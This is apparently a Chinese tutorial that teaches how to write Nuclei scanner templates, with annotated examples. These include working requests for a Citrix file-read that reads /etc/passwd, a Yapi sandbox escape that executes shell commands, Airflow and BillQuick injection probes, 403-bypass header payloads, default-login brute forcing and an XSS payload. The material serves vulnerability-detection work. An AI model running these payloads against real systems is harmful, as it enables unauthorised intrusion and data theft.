<a name="kvIPJ"></a>
## 变更记录
记录每次修订的内容，方便追溯。

| **版本号** | **作者** | **修订内容** | **发布日期** |
| --- | --- | --- | --- |
| 1.0 | 51pwn | 发布 | 2022-04-26 |


<a name="ytLiZ"></a>
# 1 Web Http经典案例
<a name="KWOwl"></a>
## 1.1 提取关键值作为下一次请求数据，使用cookie
**关键点说明**<br />1、自动获取cookie，并在下一次请求中使用，关键代码：cookie-reuse:true<br />2、从body中通过正则表达式抽取数据，并命名为：randkey，作为后续请求的数据，关键代码：internal: true表示要对后续请求数据进行替换，该部分的代码示例如下：
```
    extractors:
      - type: regex
        name: randkey # Variable name
        part: body
        group: 0
        internal: true
        regex:
          - "(?m)[0-9]{3,10}\\.[0-9]+"
```
**参考代码**
```
id: CVE-2020-8193

info:
  name: Citrix unauthenticated LFI
  author: pdteam
  severity: high
  reference: https://github.com/jas502n/CVE-2020-8193

requests:
  - raw:
      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        Content-Type: application/xml
        X-NITRO-USER: xpyZxwy6
        X-NITRO-PASS: xWXHUJ56

        <appfwprofile><login></login></appfwprofile>

      - |
        GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        GET /menu/neo HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        GET /menu/stc HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: §randkey§

        <appfwprofile><login></login></appfwprofile>

      - |
        POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: §randkey§

        <clipermission></clipermission>

    cookie-reuse: true # Using cookie-reuse to maintain session between each request, same as browser.

    extractors:
      - type: regex
        name: randkey # Variable name
        part: body
        group: 0
        internal: true
        regex:
          - "(?m)[0-9]{3,10}\\.[0-9]+"

    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body

internal表示这里定义的randkey将用于前面的请求

```
<a name="Q24XZ"></a>
## 1.2 第一次请求中所有链接，迭代作为第二个payload的多次请求
**关键点说明**<br />**1、使用关键值：**iterate-all: true说明要使用所有、匹配到的数据<br />2、使用提取器（extractors），对body基于正则表达式，使用匹配中的1（0表示匹配到的所有，1表示第一个圆括号中匹配的内容）<br />3、命名URLPath，并在第二个payload中<br />4、标记要做后续payload的替换internal: true

**参考代码**
```
id: CVE-2020-8193

info:
  name: Citrix unauthenticated LFI
  author: pdteam
  severity: high
  reference: https://github.com/jas502n/CVE-2020-8193

requests:
  - path:
      - https://example.com
      - https://example.com/{{URLPath}}

    iterate-all: true
    extractors:
      - type: regex
        part: body
        name: URLPath
        group: 1
        regex:
          - 'href="(.*)"'
        internal: true 
```
<a name="y0b9Z"></a>
## 1.3 多个payload连续请求，将匹配内容作为后续发送payload的数据
**关键点说明**<br />**1、使用关键值：**iterate-all: true说明要使用所有、匹配到的数据<br />2、使用提取器（extractors），对body基于正则表达式，使用匹配中的1（0表示匹配到的所有，1表示第一个圆括号中匹配的内容）<br />3、分别命名group_id、interface_id、interface_id，并在后续若干个payload中进行使用（替换）<br />4、标记要做后续payload的替换internal: true<br />5、matchers-condition: and表示matchers中多个条件必须满足<br />6、本案例中randstr、randstr_1表示自动填充随机字符串，其中“randstr_1”为第二个，或者多个请求构造不同的随机字符，可在matchers时进行区分

**参考代码**
```
id: yapi-rce

info:
  name: Yapi Remote Code Execution
  author: pikpikcu
  severity: critical
  tags: yapi,rce
  description: A vulnerability in Yapi allows remote unauthenticated attackers to cause the product to execute arbitrary code.
  reference:
    - https://www.secpulse.com/archives/162502.html
    - https://gist.github.com/pikpikcu/0145fb71203c8a3ad5c67b8aab47165b
    - https://twitter.com/sec715/status/1415484190561161216
    - https://github.com/YMFE/yapi

requests:
  - raw:
      - | # REQUEST 1
        POST /api/user/reg HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8

        {"email":"{{randstr}}@example.com","password":"{{randstr}}","username":"{{randstr}}"}

      - | # REQUEST 2
        GET /api/group/list HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json, text/plain, */*

      - | # REQUEST 3
        POST /api/project/add HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8

        {"name":"{{randstr}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}

      - | # REQUEST 4
        GET /api/project/get?id={{project_id}} HTTP/1.1
        Host: {{Hostname}}

      - | # REQUEST 5
        POST /api/interface/add HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8

        {"method":"GET","catid":"{{project_id}}","title":"{{randstr_1}}","path":"/{{randstr_1}}","project_id":{{project_id}}}

      - | # REQUEST 6
        POST /api/plugin/advmock/save HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8

        {"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"cat /etc/passwd\").toString()","enable":true}

      - | # REQUEST 7
        GET /mock/{{project_id}}/{{randstr_1}} HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true
    extractors:
      - type: regex
        name: group_id
        group: 1
        internal: true
        part: body
        regex:
          - '"_id":([0-9]+),"group_name"'

      - type: regex
        name: interface_id
        group: 1
        internal: true
        part: body
        regex:
          - '"req_body_form":\[\],"_id":([0-9]+)'

      - type: regex
        name: project_id
        group: 1
        internal: true
        part: body
        regex:
          - '"tag":\[\],"_id":([0-9]+)'

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body

      - type: status
        status:
          - 200
```
<a name="jsVjL"></a>
## 1.4 多种header组合测试
**关键点说明**<br />1、请求头定义变量名header_types，header_values<br />2、分别定义payload两段，名称为header_values，header_types<br />3、设定攻击类型为attack: clusterbomb<br />**Cluster bomb（集束炸弹模式）**<br />集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，还是上面的例子，如果用集束炸弹模式进行攻击，则除baseline请求外，会有四次请求：

| **attack NO.** | **location A** | **location B** |
| --- | --- | --- |
| 1 | 1 | 3 |
| 2 | 1 | 4 |
| 3 | 2 | 3 |
| 4 | 2 | 4 |

 4、这种类型的检测，必须制定unsafe: true，不然检测系统在某些情况下可能会自动消除不正确、不安全的请求头信息<br />5、这里两个变量的payload同样可以基于文件加载，基于文件加载时，由于执行的“当前”位置是确定的的，所以这种情况建议用绝对路径<br />6、延伸的知识：4种攻击类型同Burp Suite Intruder的原理

**参考代码**
```
id: Labda_403Bypass_xheaders

info:
  name: Labda 403 bypass
  author: Labda
  description: Bypasses 403 Forbidden
  tags: bypass, web, 403, Forbidden

requests:
  - raw:
      - |+
        GET / HTTP/1.1
        Host: {{BaseURL}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
        {{header_types}}: {{header_values}}
    payloads:
      header_values:
        - localhost
        - localhost:80
        - localhost:443
        - "127.0.0.1"
        - "127.0.0.1:80"
        - "127.0.0.1:443"
        - "2130706433"
        - "0x7F000001"
        - "0177.0000.0000.0001"
        - "0"
        - "127.1"
        - "10.0.0.0"
        - "10.0.0.1"
        - "172.16.0.0"
        - "172.16.0.1"
        - "192.168.1.0"
        - "192.168.1.1"
      header_types:
        - X-Custom-IP-Authorization
        - X-Forwarded-For
        - X-Forward-For
        - X-Remote-IP
        - X-Originating-IP
        - X-Remote-Addr
        - X-Client-IP
        - X-Real-IP
    attack: clusterbomb
    unsafe: true
    matchers:
        - type: status
          status:
            - 200

```
<a name="FsgeP"></a>
## 1.5 payloads使用外部文件数据
**关键点说明**<br />**1、**payloads中使用外部文件数据<br />2、定义的变量名为：Subdomains<br />3、设定攻击方式为sniper，其原理同Burp Suite Intruder中的sniper<br />狙击手模式使用一组payload集合，它一次只使用一个payload位置，假设你标记了两个位置“A”和“B”，payload值为“1”和“2”，那么它攻击会形成以下组合（除原始数据外）：

| **attack NO.** | **location A** | **location B** |
| --- | --- | --- |
| 1 | 1 | no replace |
| 2 | 2 | no replace |
| 3 | no replace | 1 |
| 4 | no replace | 2 |

 4、本经典案例制定100个线程threads: 100<br />5、为了效率指定只读区响应数据500byte作为判断<br />6、所有的匹配（matchers）度满足，matchers-condition: and<br />7、发送的数据基于裸数据发送，raw:，且是：- |，如果用“- |+”则必须指定 unsafe: true<br />8、匹配part: body按二进制binary，直接用16进制的表示方式，且指定是or关系：condition: or<br />9、正则表达式匹配part: header头部"application/[-\\w.]+"<br />10、同时满足状态码为200的情况

**参考代码**
```
id: zip-backup-files 17

info:
  name: Compressed Web File
  author: Toufik Airane,dwisiswant0
  severity: medium
  tags: exposure,backup

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /{{Subdomains}}.sql.rar HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*
    max-size: 500 # Size in bytes - Max Size to read from server response
    matchers-condition: and
    matchers:
      - type: binary
        binary:
          - "377ABCAF271C"  # 7z
          - "314159265359"  # bz2
          - "53514c69746520666f726d6174203300"  # SQLite format 3.
          - "1f8b"  # gz tar.gz
          - "526172211A0700"  # rar RAR archive version 1.50
          - "526172211A070100"  # rar RAR archive version 5.0
          - "FD377A585A0000"  # xz tar.xz
          - "1F9D"  # z tar.z
          - "1FA0"  # z tar.z
          - "4C5A4950"  # lz
          - "504B0304"  # zip
        condition: or
        part: body

      - type: regex
        regex:
          - "application/[-\\w.]+"
        part: header

      - type: status
        status:
          - 200

```
<a name="dB6Nf"></a>
## 1.6 POST文件，及使用csrf token
**关键点说明**<br />1、本案例第一个请求，用来匹配csrf，定义名称csrf，用正则表达式抽取，并内部替换internal: true<br />2、自动使用前面请求返回的cookie，cookie-reuse: true<br />3、发送自定义构造数据，- raw:<br />4、req-condition: true表示请求条件允许检查多个请求之间的条件，以编写复杂的检查和涉及多个HTTP请求的漏洞，以完成漏洞链。可参考：[https://nuclei.projectdiscovery.io/templating-guide/protocols/http/](https://nuclei.projectdiscovery.io/templating-guide/protocols/http/)，该模式启用后会跟随matchers，<br />例如：
```
req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 404 && status_code_2 == 200 && contains((body_2), 'secret_string')"
```
5、这里基于专业领域语言（DSL）进行匹配，type: dsl

**参考代码**
```
id: CVE-2021-38540

info:
  name: Apache Airflow - Unauthenticated Variable Import
  author: pdteam
  severity: critical
  description: The variable import endpoint was not protected by authentication in Airflow >=2.0.0, <2.1.3. This allowed unauthenticated users to hit that endpoint to add/modify Airflow variables used in DAGs, potentially resulting in a denial of service, information disclosure or remote code execution. This issue affects Apache Airflow >=2.0.0, <2.1.3.
  reference: https://nvd.nist.gov/vuln/detail/CVE-2021-38540
  tags: cve,cve2021,apache,airflow,rce
  metadata:
    shodan-query: title:"Sign In - Airflow"
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.80
    cve-id: CVE-2021-38540
    cwe-id: CWE-306

requests:
  - raw:
      - |
        GET /login/ HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}

      - |
        POST /variable/varimport HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB874qcjbpxTP1Hj7
        Referer: {{RootURL}}/admin/variable/

        ------WebKitFormBoundaryB874qcjbpxTP1Hj7
        Content-Disposition: form-data; name="csrf_token"

        {{csrf}}
        ------WebKitFormBoundaryB874qcjbpxTP1Hj7
        Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
        Content-Type: application/json

        {
            "type": "{{randstr}}"
        }

        ------WebKitFormBoundaryB874qcjbpxTP1Hj7--

    cookie-reuse: true
    extractors:
      - type: regex
        name: csrf
        group: 1
        internal: true
        regex:
          - 'type="hidden" value="(.*?)">'

    req-condition: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_1, "Sign In - Airflow")'
          - 'status_code_2 == 302'
          - 'contains(all_headers_2, "session=.")'
        condition: and

      - type: word
        words:
          - 'You should be redirected automatically to target URL: <a href="/">'
```
<a name="r7Ygr"></a>
## 1.7 对结果进行包含的同时进行排除
**关键点说明**<br />1、本案例tags逗号分隔，在执行检测时可以指定tag进行筛选分类poc进行检测<br />2、两个匹配条件必须同时满足matchers-condition: and<br />3、标记排除negative: true<br />**参考代码**
```
id: xp-webcam
info:
  name: XP Webcam Viewer Page
  author: aashiq
  severity: medium
  description: Searches for exposed webcams by querying the /mobile.html endpoint and the existence of webcamXP in the body.
  tags: webcam,iot
requests:
  - method: GET
    path:
      - "{{BaseURL}}/mobile.html"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "webcams and ip cameras server for windows"
        part: body
      - type: word
        words:
          - "Please provide a valid username/password to access this server."
        part: body
        negative: true

```
<a name="Ykwzs"></a>
## 1.8 在body中指定key提取value作为后续payload的数据
**关键点说明**<br />1、本案例payloads指定用户名和密码<br />2、payload攻击模式attack: pitchfork<br />草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，则攻击模式如下：

| **attack NO.** | **location A** | **location B** |
| --- | --- | --- |
| 1 | 1 | 3 |
| 2 | 2 | 4 |

3、 提取extractors定义名为token并替换后续的payload中的变量token<br />4、基于key-value模式type: kval提取并定义session变量，其中key为PHPSESSID，为后续的payload中的变量token<br />5、允许页面跳转后进行匹配处理，redirects: true

**参考代码**
```
id: dvwa-default-login

info:
  name: DVWA Default Login
  author: pdteam
  severity: critical
  description: Damn Vulnerable Web App (DVWA) is a test application for security professionals. The hard coded credentials are part of a security testing scenario.
  tags: dvwa,default-login
  reference:
    - https://opensourcelibs.com/lib/dvwa
  classification:
    cwe-id: CWE-798

requests:
  - raw:
      - |
        GET /login.php HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
        Connection: close

      - |
        POST /login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: PHPSESSID={{session}}; security=low
        Connection: close

        username={{username}}&password={{password}}&Login=Login&user_token={{token}}

    payloads:
      username:
        - admin
      password:
        - password
    attack: pitchfork

    extractors:
      - type: regex
        name: token
        group: 1
        internal: true
        part: body
        regex:
          - "hidden' name='user_token' value='([0-9a-z]+)'"

      - type: kval
        name: session
        internal: true
        part: body
        kval:
          - PHPSESSID

    redirects: true
    matchers:
      - type: word
        words:
          - "You have logged in as 'admin'"

# Enhanced by mp on 2022/03/03

```
<a name="OQXho"></a>
## 1.9 返回数据基于json模式进行提取、匹配
**关键点说明**<br />1、如果第一个请求满足匹配就停止当前检测脚本中的后续的payload，stop-at-first-match: true<br />2、后面的匹配必须都满足，matchers-condition: and<br />3、header中part: header，包含 "application/json"<br />4、抽取extractors响应数据转换为json（- type: json）并判断数组中对象包含name属性（'.[].name'）

**参考代码**
```
id: CVE-2017-5487
info:
  name: WordPress Core < 4.7.1 - Username Enumeration
  author: Manas_Harsh,daffainfo,geeknik
  severity: medium
  description: "WordPress Core < 4.7.1 is susceptible to user enumeration because it does not properly restrict listings of post authors via wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php in the REST API, which allows remote attackers to obtain sensitive information via a wp-json/wp/v2/users request."
  reference:
    - https://www.exploit-db.com/exploits/41497
    - https://nvd.nist.gov/vuln/detail/CVE-2017-5487
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.30
    cve-id: CVE-2017-5487
    cwe-id: CWE-200
  tags: cve,cve2017,wordpress
requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/wp/v2/users/"
      - "{{BaseURL}}/?rest_route=/wp/v2/users/"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        words:
          - '"id":'
          - '"name":'
          - '"avatar_urls":'
        condition: and
    extractors:
      - type: json
        json:
          - '.[].name'

# Enahnced by mp 03/31/2022
```
<a name="cHqxg"></a>
## 1.10 基于xpath匹配响应结果
**关键点说明**<br />1、自动使用cookie，cookie-reuse: true<br />2、基于xpath抽取extractors，type: xpath，并定义名为VS，internal: true替换后续payload的变量<br />3、xpath匹配到的属性：attribute: value<br />4、定义xpath，"/html/body/form/div/input[@id='__VIEWSTATE']"，需要特别注意的是，编写xpath的时候记得要灵活些，本案列中的xpath不足是什么，你是否看出来了？如果dom结构变化，这xpath就失效了，如何解决？自行实践、验证"//input[@id='__VIEWSTATE']"
<a name="uYoCv"></a>
# 
**参考代码**
```
id: CVE-2021-42258

info:
  name: BillQuick Web Suite SQL Injection
  author: dwisiswant0
  severity: critical
  tags: cve,cve2021,sqli,billquick
  description: BQE BillQuick Web Suite 2018 through 2021 before 22.0.9.1 allows SQL injection for unauthenticated remote code execution. Successful exploitation can include the ability to execute arbitrary code as MSSQLSERVER$ via xp_cmdshell.
  reference:
    - https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware
    - https://nvd.nist.gov/vuln/detail/CVE-2021-42258
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.80
    cve-id: CVE-2021-42258
    cwe-id: CWE-89

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded

        __EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE={{url_encode("Â§VSÂ§")}}&__VIEWSTATEGENERATOR={{url_encode("Â§VSGÂ§")}}&__EVENTVALIDATION={{url_encode("Â§EVÂ§")}}&txtID=uname%27&txtPW=passwd&hdnClientDPI=96

    cookie-reuse: true
    extractors:
      - type: xpath
        name: VS
        internal: true
        attribute: value
        xpath:
          - "/html/body/form/div/input[@id='__VIEWSTATE']"

      - type: xpath
        name: VSG
        internal: true
        attribute: value
        xpath:
          - "/html/body/form/div/input[@id='__VIEWSTATEGENERATOR']"

      - type: xpath
        name: EV
        internal: true
        attribute: value
        xpath:
          - "/html/body/form/div/input[@id='__EVENTVALIDATION']"

    matchers:
      - type: word
        part: body
        condition: and
        words:
          - "System.Data.SqlClient.SqlException"
          - "Incorrect syntax near"
          - "_ACCOUNTLOCKED"

# Enhanced by mp on 2022/02/27
```
<a name="RJiYP"></a>
# <br />2   Socket网络
<a name="xYl9M"></a>
## 2.1 经典案例weblogic-t3-detect
**关键点说明**<br />1、指定是网络模式network:<br />2、发送的数据可以是文本，二进制模式见下一个案例<br />3、注意，这里的extractors 抽取是见抽取的结果作为检测结果返回，并不是没有用<br />4、第二个payload，tls://表示基于tls安全套接字再次发送payload进行检测<br />5、data还可以这样发<br />-data:'hex_decode("50494e47")\r\n'<br />更多还可以参考：[https://nuclei.projectdiscovery.io/templating-guide/protocols/network/](https://nuclei.projectdiscovery.io/templating-guide/protocols/network/)<br />6、inputs可以指定name:prefix名字，为matchers匹配part:prefix提供多段的发送，匹配后继续发送<br />**参考代码**
```
id: weblogic-t3-detect

info:
  name: Detect Weblogic T3 Protocol
  author: F1tz,milo2012,wdahlenb
  severity: info
  description: Check T3 protocol status.
  tags: network,weblogic

network:
  - inputs:
      - data: "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n"
    host:
      - "{{Hostname}}"
    read-size: 1024
    matchers:
      - type: word
        words:
          - "HELO"
    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - "HELO:(.*).false"

  - inputs:
      - data: "t3s 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n"
    host:
      - "tls://{{Hostname}}"
    read-size: 1024
    matchers:
      - type: word
        words:
          - "HELO"
    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - "HELO:(.*).false"

```
**另外一个参考,基于二进制发送**<br />**要点：指定16进制数据**type: hex
```
id: Weblogic_T3

info:
  name: find weblogic T3 info
  author: 51pwn
  severity: high
  tags: network,weblogic,T3,t3

network:
  - inputs:
      - data: 74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a
        type: hex
    host:
      - "{{Hostname}}"
    read-size: 1024
    matchers:
      - type: word
        part: data
        encoding: hex
        words:
          - "HELO:"
```
<a name="sj65b"></a>
## 2.2 经典案例Weblogic_GIOP检测
**关键点说明**<br />1、socket模式network<br />2、16进制输入的二进制数据<br />3、指定了编码器：encoding: hex<br />4、返回数据中三个条件都满足condition: and

**参考代码**
```
id: Weblogic_GIOP

info:
  name: find weblogic GIOP info
  author: 51pwn
  severity: high
  tags: network,weblogic,GIOP,giop

network:
  - inputs:
      - data: 47494f50010200030000001700000002000000000000000b4e616d6553657276696365
        type: hex
    host:
      - "{{Hostname}}"
    read-size: 2048
    matchers:
      - type: word
        part: data
        encoding: hex
        words:
          - "GIOP"
          - "/bea_wls_internal/classes/"
          - ":weblogic/corba/cos/naming/NamingContextAny:"
        condition: and
```
**运行结果示例**<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/27284524/1650957579166-8ee313d4-0ff3-4752-9c04-2ecc18ba6ca6.png#clientId=uc5435299-b779-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=126&id=u6fe72943&margin=%5Bobject%20Object%5D&name=image.png&originHeight=252&originWidth=1440&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110178&status=done&style=none&taskId=u008c4bb2-6577-49f9-b955-eee10e34d4f&title=&width=720)
<a name="AFMEV"></a>
# 3 Headless浏览器模式
Headless适合哪些具有复杂输入，并页面检测了输入行为的情况，以及动态性较高系统等安全检测<br />缺点是，整个检测过程比较慢，都需要等待，有时候容易陷入假死，而这个时候nuclei退出了，Headless依然还在运行。<br />Headless还支持文件上传、css、xpath等选择器，截屏幕图等等功能<br />更多可以参考：[https://nuclei.projectdiscovery.io/templating-guide/protocols/headless/#files](https://nuclei.projectdiscovery.io/templating-guide/protocols/headless/#files)
> 风险：
> action: screenshot
> args: 
>   to: /root/test/screenshot-web
> 将截屏存储到指定的位置，所有nuclei需要指定低权限用户允许，POC审核点之一就是不能覆盖系统文件，也不能有截图的脚本，没有意义的截图

<a name="gBsaF"></a>
## 3.1 隐藏浏览器（Headless）模式
**关键点说明：**<br />1、浏览器模式headless:<br />2、定义步骤- steps:<br />3、页面导航行为action: navigate<br />4、等待加载动作- action: waitload，特别注意，如果网络卡，这种模式会等很长时间<br />5、脚本行为- action: script，hook模式hook: true，并执行了一段代码重载了alert<br />6、基于xpath找到用户名：xpath: /html/body/div/div[2]/form/fieldset/input，并设置输入为admin，value: admin，注意其后面的action: text指定了行为模式text模式，等同于文本模拟输入<br />7、xpath找到响应按钮，模拟点击action: click，然后等待加载- action: waitload<br />8、模拟键盘发送回车，并等待<br />      - args:<br />          keys: "\r" # Press the enter key on the keyboard<br />        action: keyboard<br />      - action: waitload<br />9、监测脚本行为，名为alert，监测数据window.data，目的是最终定义name为alert给matchers进行匹配<br />      - action: script<br />        name: alert<br />        args:<br />          code: "window.data"

参考代码
```
id: dvwa-xss-verification

info:
  name: DVWA Reflected XSS Verification
  author: pd-team
  severity: info

headless:
  - steps:
      - args:
          url: "{{BaseURL}}"
        action: navigate
      - action: waitload

      # Set the hook to override window.data for xss detection
      - action: script
        args:
          hook: true
          code: "(function() { window.alert = function() { window.data = 'found' } })()"
      - args:
          by: x
          value: admin
          xpath: /html/body/div/div[2]/form/fieldset/input
        action: text
      - args:
          by: x
          value: password
          xpath: /html/body/div/div[2]/form/fieldset/input[2]
        action: text
      - args:
          by: x
          xpath: /html/body/div/div[2]/form/fieldset/p/input
        action: click
      - action: waitload
      - args:
          by: x
          xpath: /html/body/div/div[2]/div/ul[2]/li[11]/a
        action: click
      - action: waitload
      - args:
          by: x
          value: '"><svg/onload=alert(1)>'
          xpath: /html/body/div/div[3]/div/div/form/p/input
        action: text
      - args:
          keys: "\r" # Press the enter key on the keyboard
        action: keyboard
      - action: waitload
      - action: script
        name: alert
        args:
          code: "window.data"
    matchers:
      - part: alert
        type: word
        words:
          - "found"
```

<a name="zl3pI"></a>
# 4 本地文件
对本地缓存文件，例如爬虫缓存对文件进行遍历分析，寻找漏洞、开发商信息等<br />**关键点说明**<br />1、no-recursive: false设置对目录进行深度查找、分析<br />2、matchers匹配器来提取结果可以直接输出控制台<br />**参考代码**
```
id: id-dev

info:
  name: 开发商信息匹配
  author: 51pwn
  severity: high
  description: nuclei -validate -t /Users/51pwn/MyWork/mybugbounty/yh/yh.yaml -target .
  tags: dev

file:
  - extensions:
      - all
      - txt
      # - response_body
    
    no-recursive: false
    extractors:
      - type: regex
        name: devName
        regex:
          - '(?:运行维护单位|技术支持)(：|:)\s*([^\s]+)\b'


```
 
<a name="YdCDC"></a>
# 5 高级篇
<a name="v8wKm"></a>
## 5.1 专业领域语言DSL
**Current DSL support functions（共51个函数），看字面就能明白其含义，就不多解释了，还可以看后面的示例：**<br />len<br />to_upper<br />to_lower<br />repeat<br />replace<br />replace_regex<br />trim<br />trim_left<br />trim_right<br />trim_space<br />trim_prefix<br />trim_suffix<br />reverse<br />base64<br />gzip<br />gzip_decode<br />zlib<br />zlib_decode<br />date<br />time<br />timetostring<br />base64_py<br />base64_decode<br />url_encode<br />url_decode<br />hex_encode<br />hex_decode<br />html_escape<br />html_unescape<br />md5<br />sha256<br />sha1<br />mmh3<br />contains<br />concat<br />regex<br />remove_bad_chars<br />rand_char<br />rand_base<br />rand_text_alphanumeric<br />rand_text_alpha<br />rand_text_numeric<br />rand_int<br />rand_ip<br />generate_java_gadget<br />unix_time<br />wait_for<br />compare_versions<br />print_debug<br />to_number<br />to_string

**示例**

| Response Part | Description | Example |
| --- | --- | --- |
| content_length | Content-Length Header | content_length >= 1024 |
| status_code | Response Status Code | status_code==200 |
| all_headers | Unique string containing all headers | len(all_headers) |
| body | Body as string | len(body) |
| header_name | Lowercase header name with - converted to _ | len(user_agent) |
| raw | Headers + Response | len(raw) |

注意：<br />DSL表达式最终返回的结果都必须是bool类型
<a name="jY92v"></a>
## 5.2 pipeline并发优化、单脚本多线程高级属性
在若干个paylaod对一个目标的情况下启用pipeline:true，pipeline是http协议的特性，请自行google脑补<br />**关键点说明**<br />1、必须启用不安全属性，unsafe: true<br />2、启用pipeline: true<br />3、指定攻击模式，attack: batteringram请<br />攻城锤模式与狙击手模式类似的地方是，同样只使用一个payload集合，不同的地方在于每次攻击都是替换所有payload标记位置，而狙击手模式每次只能替换一个payload标记位置。

| **attack NO.** | **location A** | **location B** |
| --- | --- | --- |
| 1 | 1 | 1 |
| 2 | 2 | 2 |

4、别忘记指定：“raw:”、“- |+”<br />5、配置并发<br />    threads: 250<br />    pipeline-concurrent-connections: 50<br />    pipeline-requests-per-connection: 50<br />注意，这两个参数如果在新版本中不支持，请使用如下的参数<br />6、本案列本地测试，所以payloads指定了绝对路径

**案列说明**
```
id: pipeline-webshell-scanner

info:
  name: pipeline webshell scanner
  author: 51pwn
  severity: info
  tags: web,shell,http,pipeline

requests:
  - raw:
      - |+
        GET /{{path}} HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}

    attack: batteringram
    payloads:
      path: /Users/51pwn/MyWork/vulScanPro/mtx/wsJsp.txt

    unsafe: true
    pipeline: true
    threads: 250
    pipeline-concurrent-connections: 50
    pipeline-requests-per-connection: 50
    # pipeline-max-connections: 50
    # pipeline-max-workers: 25000

    matchers:
      - type: status
        part: header
        status:
          - 200

```
<a name="PzWDp"></a>
## 5.3 常见问题
<a name="sswpM"></a>
### 5.3.1 若干个yaml文件相同参数、相同目标的请求，能否只发送一次请求，若干个yaml共享请求响应数据进行匹配、处理？
答案：当前版本已经支持
<a name="IQ04p"></a>
### 5.3.2 请求中的path都有哪些
